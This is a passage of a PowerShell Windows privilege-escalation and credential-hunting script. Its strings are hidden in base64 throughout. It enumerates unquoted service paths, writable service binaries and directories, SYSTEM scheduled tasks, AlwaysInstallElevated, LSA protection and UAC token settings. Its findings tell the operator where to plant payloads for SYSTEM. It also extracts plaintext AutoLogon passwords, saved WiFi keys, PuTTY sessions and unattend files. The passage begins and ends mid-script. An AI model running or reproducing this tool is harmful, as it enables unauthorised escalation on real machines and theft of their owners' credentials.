Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSAzIDogU0VSVklDRVM='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $svc -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VydmljZXM='))) $svc

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWxsIFJ1bm5pbmcgU2VydmljZXM='))) $svc
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVNlcnZpY2UgKHJ1bm5pbmcp'))) { Get-Service | Where-Object { $_.Status -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVubmluZw=='))) } | Format-Table -AutoSize } $svc

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5xdW90ZWQgU2VydmljZSBQYXRocw=='))) $svc
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIENoZWNraW5nIHVucXVvdGVkIHNlcnZpY2UgcGF0aHMuLi4='))) -ForegroundColor Cyan
$unquoted = @()
Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XiI='))) -and $_.PathName -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))) -and $_.PathName -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XkM6XFxXaW5kb3dz'))) } | ForEach-Object {
    $unquoted += $_.Name + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $_.PathName
    Add-Content $svc (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbVU5RVU9URURdIA=='))) + $($_.Name) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $($_.PathName))
}
if ($unquoted.Count -gt 0) {
    Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5xdW90ZWQgc2VydmljZSBwYXRoKHMpIGZvdW5kICg='))) + $($unquoted.Count) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSAtLSBwbGFudCBwYXlsb2FkIGluIGludGVybWVkaWF0ZSBwYXRoIGZvciBTWVNURU0gb24gcmVzdGFydA==')))) $svc
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgU2VydmljZSBCaW5hcmllcw=='))) $svc
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIENoZWNraW5nIHNlcnZpY2UgYmluYXJ5IHBlcm1pc3Npb25zLi4u'))) -ForegroundColor Cyan
Get-WmiObject Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
    $binPath = ($_.PathName -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ig=='))),'').Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))))[0]
    if (Test-Path $binPath) {
        $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
        if ($acl) {
            $acl.Access | Where-Object {
                $_.IdentityReference -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXZlcnlvbmV8VXNlcnN8QXV0aGVudGljYXRlZCBVc2Vyc3xCVUlMVElOXFxVc2Vycw=='))) -and
                $_.FileSystemRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGV8RnVsbENvbnRyb2x8TW9kaWZ5')))
            } | ForEach-Object {
                Add-Content $svc (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbV1JJVEFCTEUgQklOQVJZXSA='))) + $binPath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICg='))) + $($_.IdentityReference) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0g'))) + $($_.FileSystemRights) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KQ=='))))
                Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgc2VydmljZSBiaW5hcnk6IA=='))) + $binPath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0tIHJlcGxhY2Ugd2l0aCBwYXlsb2FkIGZvciBTWVNURU0gb24gcmVzdGFydA==')))) $svc
            }
        }
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgU2VydmljZSBEaXJlY3RvcmllcyAoRExMIGhpamFjayk='))) $svc
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIENoZWNraW5nIHNlcnZpY2UgYmluYXJ5IGRpcmVjdG9yaWVzIGZvciB3cml0YWJpbGl0eS4uLg=='))) -ForegroundColor Cyan
$writableSvcDirs = @()
$checkedDirs = @{}
Get-WmiObject Win32_Service | Where-Object { $_.PathName } | ForEach-Object {
    $svcName = $_.Name
    $binPath = ($_.PathName -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ig=='))),'').Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))))[0]
    if ($binPath -and (Test-Path $binPath)) {
        $binDir = Split-Path $binPath -Parent
        if ($binDir -and -not $checkedDirs.ContainsKey($binDir) -and $binDir -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XkM6XFxXaW5kb3dz')))) {
            $checkedDirs[$binDir] = $true
            $dirAcl = Get-Acl $binDir -ErrorAction SilentlyContinue
            if ($dirAcl) {
                $dirAcl.Access | Where-Object {
                    $_.IdentityReference -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXZlcnlvbmV8VXNlcnN8QXV0aGVudGljYXRlZCBVc2Vyc3xCVUlMVElOXFxVc2Vycw=='))) -and
                    $_.FileSystemRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGV8RnVsbENvbnRyb2x8TW9kaWZ5')))
                } | ForEach-Object {
                    $writableSvcDirs += ($binDir + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IChzZXJ2aWNlOiA='))) + $svcName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KQ=='))))
                    Add-Content $svc (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbV1JJVEFCTEUgU1ZDIERJUl0g'))) + $binDir + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IChzZXJ2aWNlOiA='))) + $svcName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LCA='))) + $($_.IdentityReference) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0g'))) + $($_.FileSystemRights) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KQ=='))))
                    Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgc2VydmljZSBkaXJlY3Rvcnk6IA=='))) + $binDir + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IChzZXJ2aWNlOiA='))) + $svcName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSAtLSBETEwgaGlqYWNrIHBvc3NpYmxl')))) $svc
                }
            }
        }
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TW9kaWZpYWJsZSBTZXJ2aWNlcyAoc2Mgc2RzaG93KQ=='))) $svc
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YWNjZXNzY2hrIChpZiBhdmFpbGFibGUp'))) { accesschk.exe /accepteula -uwcqv ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXZlcnlvbmU='))) * 2>$null } $svc
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YWNjZXNzY2hrIFVzZXJz'))) { accesschk.exe /accepteula -uwcqv ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VXNlcnM='))) * 2>$null } $svc

Separator $svc
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $svc + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  4. SCHEDULED TASKS
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA0IDogU0NIRURVTEVEIFRBU0tT'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $tasks -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2NoZWR1bGVkIFRhc2tz'))) $tasks

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWxsIFNjaGVkdWxlZCBUYXNrcw=='))) $tasks
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c2NodGFza3MgL3F1ZXJ5'))) { schtasks /query /fo LIST /v } $tasks

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFza3MgUnVubmluZyBhcyBTWVNURU0gd2l0aCBXcml0YWJsZSBTY3JpcHRz'))) $tasks
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIENoZWNraW5nIHNjaGVkdWxlZCB0YXNrIHNjcmlwdHMgZm9yIHdyaXRhYmlsaXR5Li4u'))) -ForegroundColor Cyan
schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv | Where-Object {
    $_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVuIEFzIFVzZXI='))) -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1lTVEVNfEFkbWluaXN0cmF0b3I='))) -and $_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFzayBUbyBSdW4='))) -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q09NIGhhbmRsZXI=')))
} | ForEach-Object {
    $taskExe = $_.([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VGFzayBUbyBSdW4=')))
    if ($taskExe -and (Test-Path $taskExe)) {
        $acl = Get-Acl $taskExe -ErrorAction SilentlyContinue
        if ($acl) {
            $acl.Access | Where-Object {
                $_.IdentityReference -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXZlcnlvbmV8VXNlcnN8QXV0aGVudGljYXRlZCBVc2Vyc3xCVUlMVElOXFxVc2Vycw=='))) -and
                $_.FileSystemRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGV8RnVsbENvbnRyb2x8TW9kaWZ5')))
            } | ForEach-Object {
                Add-Content $tasks (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbV1JJVEFCTEUgVEFTSyBTQ1JJUFRdIA=='))) + $taskExe)
                Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgc2NoZWR1bGVkIHRhc2sgc2NyaXB0IHJ1bm5pbmcgYXMgU1lTVEVNOiA='))) + $taskExe) $tasks
            }
        }
    }
}

Separator $tasks
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $tasks + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  5. REGISTRY CHECKS
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA1IDogUkVHSVNUUlk='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $reg -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVnaXN0cnkgQ2hlY2tz'))) $reg

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWx3YXlzSW5zdGFsbEVsZXZhdGVk'))) $reg
$aieHKLM = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy'))) -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKCU = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy'))) -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
Add-Content $reg (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBIS0xNIEFsd2F5c0luc3RhbGxFbGV2YXRlZDog'))) + $aieHKLM)
Add-Content $reg (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBIS0NVIEFsd2F5c0luc3RhbGxFbGV2YXRlZDog'))) + $aieHKCU)
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWx3YXlzSW5zdGFsbEVsZXZhdGVkIGlzIHNldCBpbiBib3RoIEhLTE0gYW5kIEhLQ1UgLS0gTVNJIHBheWxvYWQgcnVucyBhcyBTWVNURU0h'))) $reg
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXV0b0xvZ29uIENyZWRlbnRpYWxz'))) $reg
$winlogon = Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24='))) -ErrorAction SilentlyContinue
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2lubG9nb24='))) { Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24='))) | Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon | Format-List } $reg
if ($winlogon.DefaultPassword) {
    Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXV0b0xvZ29uIHBhc3N3b3JkIGZvdW5kIGluIHJlZ2lzdHJ5OiBEZWZhdWx0UGFzc3dvcmQgPSA='))) + $($winlogon.DefaultPassword)) $reg
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3RvcmVkIFBhc3N3b3JkcyBpbiBSZWdpc3RyeQ=='))) $reg
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U05NUCBjb21tdW5pdHkgc3RyaW5ncw=='))) { Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNOTVBcUGFyYW1ldGVyc1xWYWxpZENvbW11bml0aWVz'))) -ErrorAction SilentlyContinue } $reg
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHVUVFkgc2F2ZWQgc2Vzc2lvbnM='))) { Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU29mdHdhcmVcU2ltb25UYXRoYW1cUHVUVFlcU2Vzc2lvbnM='))) -ErrorAction SilentlyContinue | ForEach-Object { Get-ItemProperty $_.PSPath } } $reg

$puttyPass = Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtDVTpcU29mdHdhcmVcU2ltb25UYXRoYW1cUHVUVFlcU2Vzc2lvbnM='))) -ErrorAction SilentlyContinue
if ($puttyPass) {
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHVUVFkgc2F2ZWQgc2Vzc2lvbnMgZm91bmQgLS0gbWF5IGNvbnRhaW4gY3JlZGVudGlhbHM='))) $reg
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TFNBIENhY2hlZCBDcmVkZW50aWFscw=='))) $reg
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2FjaGVkTG9nb25zQ291bnQ='))) { (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=')))).CachedLogonsCount } $reg

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TFNBIFByb3RlY3Rpb24gLyBDcmVkZW50aWFsIEd1YXJk'))) $reg
$lsaProtection = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNh'))) -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
$credGuard = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcTHNh'))) -Name LsaCfgFlags -ErrorAction SilentlyContinue).LsaCfgFlags
Add-Content $reg (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBSdW5Bc1BQTCAoTFNBIFByb3RlY3Rpb24pOiA='))) + $lsaProtection)
Add-Content $reg (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBMc2FDZmdGbGFncyAoQ3JlZGVudGlhbCBHdWFyZCk6IA=='))) + $credGuard)
if (-not $lsaProtection -or $lsaProtection -eq 0) {
    Add-Content $reg ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbaW5mb10gTFNBIFByb3RlY3Rpb24gTk9UIGVuYWJsZWQgLS0gTFNBU1MgZHVtcGluZyBub3QgYmxvY2tlZCBieSBQUEw=')))
}
if ($credGuard -eq 1 -or $credGuard -eq 2) {
    Add-Content $reg ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbaW5mb10gQ3JlZGVudGlhbCBHdWFyZCBlbmFibGVkIC0tIExTQVNTIGhhc2hlcy90aWNrZXRzIGlzb2xhdGVkIGluIFZCUw==')))
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VUFDIENvbmZpZ3VyYXRpb24='))) $reg
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VUFDIExldmVs'))) { Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt'))) | Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy | Format-List } $reg
$uac = Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt'))) -ErrorAction SilentlyContinue
if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k9MSAtLSByZW1vdGUgYWRtaW4gb3ZlciBTTUIvV2luUk0gaGFzIGZ1bGwgdG9rZW4gKFBUSCBmcmllbmRseSk='))) $reg
}

Separator $reg
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $reg + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  6. NETWORK INFORMATION
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA2IDogTkVUV09SSyBJTkZPUk1BVElPTg=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $netstuff -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TmV0d29yayBJbmZvcm1hdGlvbg=='))) $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW50ZXJmYWNlcw=='))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aXBjb25maWcgL2FsbA=='))) { ipconfig /all } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Um91dGluZyBUYWJsZQ=='))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cm91dGUgcHJpbnQ='))) { route print } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWN0aXZlIENvbm5lY3Rpb25z'))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c3RhdCAtYW5v'))) { netstat -ano } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QVJQIENhY2hl'))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXJwIC1h'))) { arp -a } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RE5TIENhY2hl'))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aXBjb25maWcgL2Rpc3BsYXlkbnM='))) { ipconfig /displaydns } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SG9zdHMgRmlsZQ=='))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aG9zdHM='))) { Get-Content C:\Windows\System32\drivers\etc\hosts } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmlyZXdhbGwgUnVsZXM='))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcw=='))) { netsh advfirewall show allprofiles } $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5ib3VuZCBhbGxvdyBydWxlcw=='))) { netsh advfirewall firewall show rule name=all dir=in action=allow | Select-String ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVsZSBOYW1lfExvY2FsUG9ydHxSZW1vdGVJUA=='))) | Select-Object -First 40 } $netstuff

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2lGaSBTYXZlZCBQcm9maWxlcw=='))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggd2xhbiBzaG93IHByb2ZpbGVz'))) { netsh wlan show profiles } $netstuff
$wifiProfiles = netsh wlan show profiles 2>$null | Select-String ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWxsIFVzZXIgUHJvZmlsZQ=='))) | ForEach-Object { ($_ -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Og=='))))[1].Trim() }
foreach ($profile in $wifiProfiles) {
    $key = netsh wlan show profile name=$profile key=clear 2>$null | Select-String ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('S2V5IENvbnRlbnQ=')))
    if ($key) {
        Add-Content $netstuff (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbV0lGSSBDUkVEXSBQcm9maWxlOiA='))) + $profile + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0+IA=='))) + $key)
        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2lGaSBwYXNzd29yZCByZWNvdmVyZWQgZm9yIHByb2ZpbGU6IA=='))) + $profile) $netstuff
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2hhcmVz'))) $netstuff
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0IHNoYXJl'))) { net share } $netstuff

Separator $netstuff
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $netstuff + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  7. CREDENTIAL HUNTING
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA3IDogQ1JFREVOVElBTCBIVU5USU5H'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $creds -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q3JlZGVudGlhbCBIdW50aW5n'))) $creds

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hdHRlbmQgLyBTeXNwcmVwIEZpbGVz'))) $creds
$unattendPaths = @(
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xQYW50aGVyXHVuYXR0ZW5kLnhtbA=='))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xQYW50aGVyXFVuYXR0ZW5kZWQueG1s'))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xzeXN0ZW0zMlxzeXNwcmVwXHVuYXR0ZW5kLnhtbA=='))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xzeXN0ZW0zMlxzeXNwcmVwXHN5c3ByZXAueG1s'))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcdW5hdHRlbmQueG1s'))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qzpcc3lzcHJlcC5pbmY='))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qzpcc3lzcHJlcFxzeXNwcmVwLnhtbA==')))
)
foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        Run-Cmd $path { Get-Content $path } $creds
